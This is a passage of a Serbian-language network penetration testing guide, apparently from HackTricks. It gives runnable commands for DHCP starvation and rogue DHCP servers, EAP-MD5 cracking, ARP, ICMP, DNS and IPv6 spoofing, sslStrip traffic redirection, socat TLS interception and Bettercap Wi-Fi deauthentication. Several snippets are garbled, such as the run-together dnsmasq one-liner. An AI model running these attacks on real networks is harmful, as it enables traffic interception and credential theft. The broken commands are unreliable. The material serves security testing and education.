U korporativnim okruženjima, kako bi se oponašao postojeći VoIP uređaj, moguće je:

* Pregledati MAC oznaku na telefonu.
* Prikazati informacije o modelu putem postavki ekrana telefona.
* Povezati VoIP uređaj sa laptopom i posmatrati CDP zahteve pomoću Wireshark alata.

Primer komande za izvršavanje alata u trećem modu bi bio:

```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```

#### Enumeracija

**DHCP Discover**

Kada se uređaj poveže sa mrežom, on šalje DHCP Discover poruku kako bi pronašao DHCP server. Ova poruka sadrži MAC adresu uređaja i zahteva IP adresu od DHCP servera.

**DHCP Offer**

Kada DHCP server primi DHCP Discover poruku, on šalje DHCP Offer poruku koja sadrži IP adresu koju nudi uređaju. Ova poruka takođe sadrži MAC adresu DHCP servera.

**DHCP Request**

Ukoliko uređaj prihvati ponuđenu IP adresu, on šalje DHCP Request poruku DHCP serveru. Ova poruka potvrđuje da uređaj želi da koristi ponuđenu IP adresu.

**DHCP Acknowledgment**

Kada DHCP server primi DHCP Request poruku, on šalje DHCP Acknowledgment poruku koja potvrđuje da je IP adresa dodeljena uređaju.

#### DHCP Starvation Attack

Napad DHCP Starvation se sastoji od slanja velikog broja DHCP Discover poruka na mrežu kako bi se iscrpeli svi dostupni IP adrese iz DHCP pool-a. Ovo može dovesti do toga da uređaji ne mogu dobiti validnu IP adresu od DHCP servera.

#### DHCP Spoofing Attack

Napad DHCP Spoofing se sastoji od lažnog DHCP servera koji šalje DHCP Offer poruke na mrežu. Ovi lažni DHCP serveri mogu dodeliti zlonamernim uređajima lažne IP adrese i druge konfiguracijske informacije. Ovo može dovesti do napada na mrežu, kao što su Man-in-the-Middle napadi.

```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```

**DoS**

Moguće je izvesti **dva tipa DoS** napada na DHCP servere. Prvi tip podrazumeva **simuliranje dovoljnog broja lažnih hostova kako bi se iskoristile sve moguće IP adrese**.\
Ovaj napad će uspeti samo ako možete videti odgovore DHCP servera i završiti protokol (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Na primer, ovo **nije moguće u WiFi mrežama**.

Drugi način za izvođenje DHCP DoS napada je slanje **DHCP-RELEASE paketa koristeći svaku moguću IP adresu kao izvorni kod**. Tada će server misliti da su svi završili sa korišćenjem IP adrese.

```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```

Jedan automatizovaniji način za to je korišćenje alata [DHCPing](https://github.com/kamorin/DHCPig)

Možete koristiti pomenute DoS napade da biste naterali klijente da dobiju nove zakupljene adrese unutar okruženja i iscrpeli legitimne servere kako bi postali neodzivni. Tako kada legitimni pokušaju ponovno povezivanje, **možete poslužiti zlonamerne vrednosti koje su pomenute u sledećem napadu**.

#### Postavljanje zlonamernih vrednosti

Lažni DHCP server može biti postavljen korišćenjem DHCP skripte smeštene na lokaciji `/usr/share/responder/DHCP.py`. Ovo je korisno za mrežne napade, poput presretanja HTTP saobraćaja i poverljivih podataka, preusmeravanjem saobraćaja na zlonamerni server. Međutim, postavljanje lažnog gateway-a je manje efikasno jer omogućava samo presretanje izlaznog saobraćaja sa klijenta, propuštajući odgovore od stvarnog gateway-a. Umesto toga, preporučuje se postavljanje lažnog DNS ili WPAD servera za efikasniji napad.

Ispod su opcije komande za konfigurisanje lažnog DHCP servera:

* **Naša IP adresa (Gateway Advertisement)**: Koristite `-i 10.0.0.100` da biste reklamirali IP adresu vašeg računara kao gateway.
* **Lokalno DNS ime domena**: Opciono, koristite `-d example.org` da biste postavili lokalno DNS ime domena.
* **Originalni Router/Gateway IP**: Koristite `-r 10.0.0.1` da biste specificirali IP adresu legitimnog rutera ili gateway-a.
* **IP adresa primarnog DNS servera**: Koristite `-p 10.0.0.100` da biste postavili IP adresu lažnog DNS servera koji kontrolišete.
* **IP adresa sekundarnog DNS servera**: Opciono, koristite `-s 10.0.0.1` da biste postavili IP adresu sekundarnog DNS servera.
* **Netmask lokalne mreže**: Koristite `-n 255.255.255.0` da biste definisali netmasku za lokalnu mrežu.
* **Interfejs za DHCP saobraćaj**: Koristite `-I eth1` da biste osluškivali DHCP saobraćaj na određenom mrežnom interfejsu.
* **WPAD adresa konfiguracije**: Koristite `-w “http://10.0.0.100/wpad.dat”` da biste postavili adresu za WPAD konfiguraciju, pomažući u presretanju web saobraćaja.
* **IP adresa lažnog podrazumevanog gateway-a**: Uključite `-S` da biste lažirali IP adresu podrazumevanog gateway-a.
* **Odgovor na sve DHCP zahteve**: Uključite `-R` da biste serveru omogućili odgovor na sve DHCP zahteve, ali budite svesni da je ovo bučno i može biti otkriveno.

Pravilnim korišćenjem ovih opcija, može se uspostaviti lažni DHCP server za efikasno presretanje mrežnog saobraćaja.

```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```

### **Napadi na EAP**

Evo nekih taktika napada koje se mogu koristiti protiv implementacija 802.1X:

* Aktivno grubo sile brušenje lozinke putem EAP-a
* Napad na RADIUS server sa oštećenim EAP sadržajem _(eksploiti)_
* Snimanje EAP poruka i offline dešifrovanje lozinke (EAP-MD5 i PEAP)
* Prisiljavanje EAP-MD5 autentifikacije radi zaobilaženja provere TLS sertifikata
* Ubacivanje zlonamernog mrežnog saobraćaja prilikom autentifikacije korišćenjem huba ili sličnog

Ako je napadač između žrtve i servera za autentifikaciju, mogao bi pokušati da degradira (ako je potrebno) autentifikacioni protokol na EAP-MD5 i snimi pokušaj autentifikacije. Zatim bi mogao primeniti grubu silu na to koristeći:

```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```

### Napadi na FHRP (GLBP i HSRP) <a href="#id-6196" id="id-6196"></a>

**FHRP** (Protokol za redundanciju prvog koraka) je klasa mrežnih protokola dizajnirana za **stvaranje sistema za vruću redundanciju rutiranja**. Sa FHRP-om, fizički ruteri mogu biti kombinovani u jedan logički uređaj, što povećava otpornost na greške i pomaže u raspodeli opterećenja.

**Inženjeri kompanije Cisco Systems su razvili dva FHRP protokola, GLBP i HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Postoje tri verzije Routing Information Protocol (RIP): RIP, RIPv2 i RIPng. RIP i RIPv2 šalju datagrame vršnjacima putem porta 520 koristeći UDP, dok RIPng emituje datagrame na UDP portu 521 putem IPv6 multicast-a. RIPv2 podržava MD5 autentifikaciju, dok RIPng ne uključuje nativnu autentifikaciju, već se oslanja na opcione IPsec AH i ESP zaglavlja unutar IPv6.

* **RIP i RIPv2:** Komunikacija se vrši putem UDP datagrama na portu 520.
* **RIPng:** Koristi UDP port 521 za emitovanje datagrama putem IPv6 multicast-a.

Napomena: RIPv2 podržava MD5 autentifikaciju, dok RIPng ne uključuje nativnu autentifikaciju, već se oslanja na IPsec AH i ESP zaglavlja u IPv6.

### Napadi na EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** je dinamički rutirajući protokol. **To je protokol vektora udaljenosti.** Ako nema autentifikacije i konfiguracije pasivnih interfejsa, **napadač** može ometati EIGRP rutiranje i izazvati **trovanje tabela rutiranja**. Osim toga, EIGRP mreža (tj. autonomni sistem) **je ravna i nema segmentaciju u zone**. Ako **napadač ubaci rutu**, verovatno je da će se ova ruta **proširiti** kroz autonomni EIGRP sistem.

Da bi se napao EIGRP sistem, potrebno je **uspostaviti susedstvo sa legitimnim EIGRP ruterom**, što otvara mnoge mogućnosti, od osnovnog izviđanja do različitih ubrizgavanja.

[**FRRouting**](https://frrouting.org/) vam omogućava da implementirate **virtuelni ruter koji podržava BGP, OSPF, EIGRP, RIP i druge protokole**. Sve što trebate da uradite je da ga implementirate na napadačevom sistemu i možete se pretvarati da ste legitimni ruter u domenu rutiranja.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) ima mogućnosti za presretanje emitovanja EIGRP (Enhanced Interior Gateway Routing Protocol). Takođe omogućava ubrizgavanje paketa, što se može koristiti za izmenu rutirajućih konfiguracija.

### OSPF

U Open Shortest Path First (OSPF) protokolu se često koristi **MD5 autentifikacija kako bi se osigurala sigurna komunikacija između rutera**. Međutim, ova sigurnosna mera može biti kompromitovana korišćenjem alata poput Loki i John the Ripper. Ovi alati su sposobni da uhvate i dešifruju MD5 hešove, otkrivajući autentifikacioni ključ. Kada se ovaj ključ dobije, može se koristiti za unošenje novih rutnih informacija. Za konfigurisanje parametara rute i uspostavljanje kompromitovanog ključa koriste se kartice _Injection_ i _Connection_.

* **Hvatanje i Dešifrovanje MD5 Hešova:** Za ove svrhe koriste se alati poput Loki i John the Ripper.
* **Konfigurisanje Parametara Rute:** Ovo se radi putem kartice _Injection_.
* **Postavljanje Kompromitovanog Ključa:** Ključ se konfiguriše na kartici _Connection_.

### Ostali Generički Alati i Izvori

* [**Above**](https://github.com/c4s73r/Above): Alat za skeniranje mrežnog saobraćaja i pronalaženje ranjivosti
* Možete pronaći **više informacija o napadima na mrežu** [**ovde**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Napadač konfiguriše sve mrežne parametre (GW, IP, DNS) novog člana mreže slanjem lažnih DHCP odgovora.

```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```

### ARP Spoofing

Proverite [prethodni odeljak](./#arp-spoofing).

### ICMPRedirect

ICMP preusmeravanje se sastoji od slanja ICMP paketa tipa 1, kod 5, koji ukazuje da je napadač najbolji način da se dođe do određene IP adrese. Zatim, kada žrtva želi da kontaktira tu IP adresu, paket će biti poslat preko napadača.

```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```

### DNS Spoofing

Napadač će rešiti neke (ili sve) domene koje žrtva traži.

```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```

**Konfigurišite sopstveni DNS sa dnsmasq**

Da biste konfigurisali sopstveni DNS server koristeći dnsmasq, pratite sledeće korake:

1. Instalirajte dnsmasq na vašem serveru:

```
sudo apt-get install dnsmasq
```

2. Otvorite konfiguracioni fajl dnsmasq:

```
sudo nano /etc/dnsmasq.conf
```

3. Konfigurišite dnsmasq da koristi vašu IP adresu kao DNS server:

```
listen-address=your_ip_address
```

4. Dodajte željene DNS zapise u konfiguracioni fajl. Na primer:

```
address=/example.com/your_ip_address
```

5. Sačuvajte i zatvorite fajl.
6. Pokrenite dnsmasq servis:

```
sudo systemctl start dnsmasq
```

Sada ste uspešno konfigurisali sopstveni DNS server koristeći dnsmasq. Možete koristiti ovaj server za preusmeravanje DNS upita i prilagođavanje DNS zapisa prema vašim potrebama.

```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```

### Lokalni gateway-ji

Često postoje više ruta do sistema i mreža. Nakon što napravite listu MAC adresa unutar lokalne mreže, koristite _gateway-finder.py_ da biste identifikovali hostove koji podržavaju IPv4 prosleđivanje.

```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```

### [Lažiranje LLMNR, NBT-NS i mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Za lokalno razrešavanje imena kada DNS pretrage ne uspeju, Microsoft sistemi se oslanjaju na **Link-Local Multicast Name Resolution (LLMNR)** i **NetBIOS Name Service (NBT-NS)**. Slično tome, **Apple Bonjour** i **Linux zero-configuration** implementacije koriste **Multicast DNS (mDNS)** za otkrivanje sistema unutar mreže. Zbog neautentifikovane prirode ovih protokola i njihovog rada preko UDP, slanjem emitovanih poruka, oni mogu biti iskorišćeni od strane napadača koji žele da preusmere korisnike na zlonamerne usluge.

Možete se predstavljati kao usluge koje hostovi traže koristeći Responder za slanje lažnih odgovora.\
Pročitajte više informacija o [kako se predstaviti kao usluge pomoću Responder-a](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Lažiranje WPAD-a](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Preglednici često koriste **Web Proxy Auto-Discovery (WPAD) protokol za automatsko dobijanje podešavanja proksi servera**. To uključuje dobijanje detalja konfiguracije sa servera, posebno putem URL-a kao što je "http://wpad.example.org/wpad.dat". Otkrivanje ovog servera od strane klijenata može se desiti putem različitih mehanizama:

* Putem **DHCP**-a, gde se otkrivanje olakšava korišćenjem posebnog unosa sa kodom 252.
* Preko **DNS**-a, što uključuje traženje imena hosta označenog kao _wpad_ unutar lokalne domene.
* Putem **Microsoft LLMNR i NBT-NS**, koji su rezervni mehanizmi koji se koriste u slučajevima kada DNS pretrage ne uspeju.

Alat Responder iskorišćava ovaj protokol tako što deluje kao **zlonamerni WPAD server**. Koristi DHCP, DNS, LLMNR i NBT-NS da bi prevario klijente da se povežu sa njim. Da biste se detaljnije upustili u to kako se usluge mogu predstavljati koristeći Responder, [proverite ovo](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Lažiranje SSDP i UPnP uređaja](spoofing-ssdp-and-upnp-devices.md)

Možete ponuditi različite usluge u mreži kako biste **prevarili korisnika** da unese neke **plain-text kredencijale**. **Više informacija o ovom napadu u** [**Lažiranje SSDP i UPnP uređaja**](spoofing-ssdp-and-upnp-devices.md)**.**

### Lažiranje IPv6 Neighbor

Ovaj napad je veoma sličan ARP lažiranju, ali u svetu IPv6. Možete naterati žrtvu da pomisli da je IPv6 GW ima MAC adresu napadača.

```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```

### IPv6 Spoofovanje/Floodovanje Oglašavanja Rutera

Neke operativne sisteme podrazumevano konfigurišu podrazumevanu rutu na osnovu paketa za oglašavanje rutera (RA) poslatih u mreži. Da biste sebe proglasili kao IPv6 ruter, možete koristiti:

```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```

### IPv6 DHCP spoofing

Podrazumevano, neki operativni sistemi pokušavaju da konfigurišu DNS čitajući DHCPv6 paket u mreži. Zatim, napadač može poslati DHCPv6 paket da se konfiguriše kao DNS. DHCP takođe pruža IPv6 adresu žrtvi.

```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```

### HTTP (lažna stranica i ubacivanje JS koda)

## Internet napadi

### sslStrip

Osnovno što ovaj napad radi je da, u slučaju da **korisnik** pokuša **pristupiti** HTTP stranici koja se **preusmjerava** na HTTPS verziju, **sslStrip** će **održavati** HTTP vezu sa **klijentom** i HTTPS vezu sa **serverom**, tako da će moći **presresti** vezu u **čistom tekstu**.

```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```

Više informacija [ovde](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ i dns2proxy za zaobilaženje HSTS

**Razlika** između **sslStrip+ i dns2proxy** u odnosu na **sslStrip** je što će oni **preusmeriti** na primer _**www.facebook.com**_ **na** _**wwww.facebook.com**_ (primetite **dodatno** slovo "**w**") i postaviće **IP adresu ovog domena kao IP napadača**. Na ovaj način, **klijent** će se **povezati** na _**wwww.facebook.com**_ **(napadača)**, ali iza kulisa **sslstrip+** će **održavati** pravu vezu putem https sa **www.facebook.com**.

**Cilj** ove tehnike je da se **izbegne HSTS** jer _**wwww**.facebook.com_ **neće** biti sačuvan u kešu pregledača, pa će pregledač biti prevaren da izvrši **autentifikaciju na Facebook-u preko HTTP-a**.\
Napomena: Da bi se izveo ovaj napad, žrtva mora pokušati da pristupi [http://www.faceook.com](http://www.faceook.com) na početku, a ne preko HTTPS-a. Ovo se može postići izmenom linkova unutar HTTP stranice.

Više informacija [ovde](https://www.bettercap.org/legacy/#hsts-bypass), [ovde](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) i [ovde](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ili sslStrip+ više ne funkcionišu. To je zato što postoje HSTS pravila koja su unapred sačuvana u pregledačima, pa čak i ako je prvi put da korisnik pristupa "važnom" domenu, pristupiće mu preko HTTPS-a. Takođe, primetite da unapred sačuvana pravila i druga generisana pravila mogu koristiti oznaku** [**`includeSubdomains`**](https://hstspreload.appspot.com) **tako da prethodni primer sa** _**wwww.facebook.com**_ **više neće funkcionisati jer** _**facebook.com**_ **koristi HSTS sa `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Slušanje TCP na portu

```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```

## TCP + SSL osluškivanje na portu

#### Generisanje ključeva i samopotpisanog sertifikata

```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```

#### Slušanje korišćenjem sertifikata

Kada se vrši pasivno prisluškivanje mreže, može biti korisno koristiti sertifikate kako bi se dešifrovala komunikacija između klijenta i servera. Ovaj metod se često koristi u situacijama kada se koristi HTTPS protokol za enkripciju podataka.

Da biste koristili ovu tehniku, prvo je potrebno generisati lažni sertifikat koji će se koristiti za dešifrovanje saobraćaja. Zatim, sertifikat se instalira na uređaju koji će vršiti prisluškivanje.

Kada se sertifikat instalira, uređaj može dešifrovati saobraćaj između klijenta i servera. Ovo omogućava hakeru da prati i analizira komunikaciju, uključujući i osetljive informacije kao što su korisnička imena, lozinke i druge privatne podatke.

Važno je napomenuti da je ova tehnika ilegalna i može biti kršenje privatnosti. Korišćenje ove tehnike treba da se vrši samo u okviru zakonskih i etičkih granica, kao deo legitimnog testiranja bezbednosti ili istraživanja.

```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```

#### Slušajte koristeći sertifikat i preusmerite na hostove

Da biste izvršili ovu tehniku, prvo morate generisati lažni sertifikat koji će se koristiti za presretanje saobraćaja. Zatim, morate konfigurisati svoj sistem da koristi taj sertifikat kako bi mogao da presreće SSL/TLS saobraćaj.

Evo koraka koje treba slediti:

1. Generišite lažni sertifikat koji će se koristiti za presretanje saobraćaja. Možete koristiti alate kao što su `openssl` ili `mitmproxy` za generisanje sertifikata.
2. Konfigurišite svoj sistem da koristi lažni sertifikat. Ovo može zavisiti od operativnog sistema koji koristite. Na primer, na Linuxu možete koristiti alat `sslstrip` za presretanje SSL/TLS saobraćaja.
3. Pokrenite alat za presretanje saobraćaja i osluškujte na određenom portu. Na primer, možete koristiti alat `mitmproxy` sa sledećom komandom: `mitmproxy -p <port>`.
4. Podesite preusmerenje saobraćaja na određene hostove. To možete postići konfigurisanjem alata za presretanje saobraćaja da preusmerava saobraćaj na određene IP adrese ili domene.

Kada je sve konfigurisano, alat za presretanje saobraćaja će presretati SSL/TLS saobraćaj i preusmeravati ga na određene hostove koje ste konfigurisali. Ovo vam omogućava da analizirate i manipulišete saobraćaj između klijenta i servera.

```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```

Ponekad, ako klijent proveri da li je CA validan, možete **poslužiti sertifikat druge hostne ime potpisan od strane CA**.\
Još jedan interesantan test je da poslužite **sertifikat za traženo hostno ime, ali samopotpisan**.

Druga stvar koju treba testirati je pokušaj potpisivanja sertifikata sa validnim sertifikatom koji nije validan CA. Ili korišćenje validnog javnog ključa, prisiljavanje na korišćenje algoritma kao što je Diffie-Hellman (koji ne zahteva dešifrovanje bilo čega sa stvarnim privatnim ključem) i kada klijent zatraži probu stvarnog privatnog ključa (kao što je heš), poslati lažnu probu i očekivati da klijent to ne proveri.

## Bettercap

```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```

### Beleške o aktivnom otkrivanju

Imajte na umu da kada se UDP paket pošalje uređaju koji nema traženi port, šalje se ICMP (Port Unreachable) poruka.

### **ARP otkrivanje**

ARP paketi se koriste za otkrivanje IP adresa koje se koriste unutar mreže. Računar mora poslati zahtev za svaku moguću IP adresu, a samo one koje se koriste će odgovoriti.

### **mDNS (multicast DNS)**

Bettercap šalje mDNS zahtev (svakih X ms) tražeći **\_services\_.dns-sd.\_udp.local** mašina koja vidi ovaj paket obično odgovara na ovaj zahtev. Zatim, samo traži mašine koje odgovaraju na "services".

**Alati**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap emituje pakete na port 137/UDP tražeći ime "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap emituje SSDP pakete tražeći sve vrste usluga (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap emituje WSD pakete tražeći usluge (UDP Port 3702).

## Reference

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty savet**: **registrujte se** na **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! Pridružite nam se danas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
